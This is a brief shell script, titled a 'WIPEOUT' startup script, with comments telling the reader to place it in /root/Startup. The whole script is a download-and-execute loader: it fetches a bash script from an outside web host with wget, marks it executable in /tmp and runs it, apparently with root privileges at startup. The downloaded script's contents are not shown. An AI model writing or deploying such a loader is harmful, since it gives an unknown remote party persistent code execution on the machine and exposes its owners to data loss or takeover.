# /root/Startup WIPEOUT script  make a file of it and put it on (changes.dat) /root/Startup
# WIPEOUT calls remotelly bash script "john_downloads_remote_dim-000.sh" and then executes it
cd /tmp ;
FILE="john_downloads_remote_dim-000.sh";
URL="http://swf-dim.matheme.win/4class_sfs/";
#change FILE to sch dim name
wget "$URL""$FILE" -T 10  --directory-prefix=/tmp/;
chmod a+x /tmp/"$FILE";
sh ./"$FILE";
echo "$URL""$FILE";
echo "END"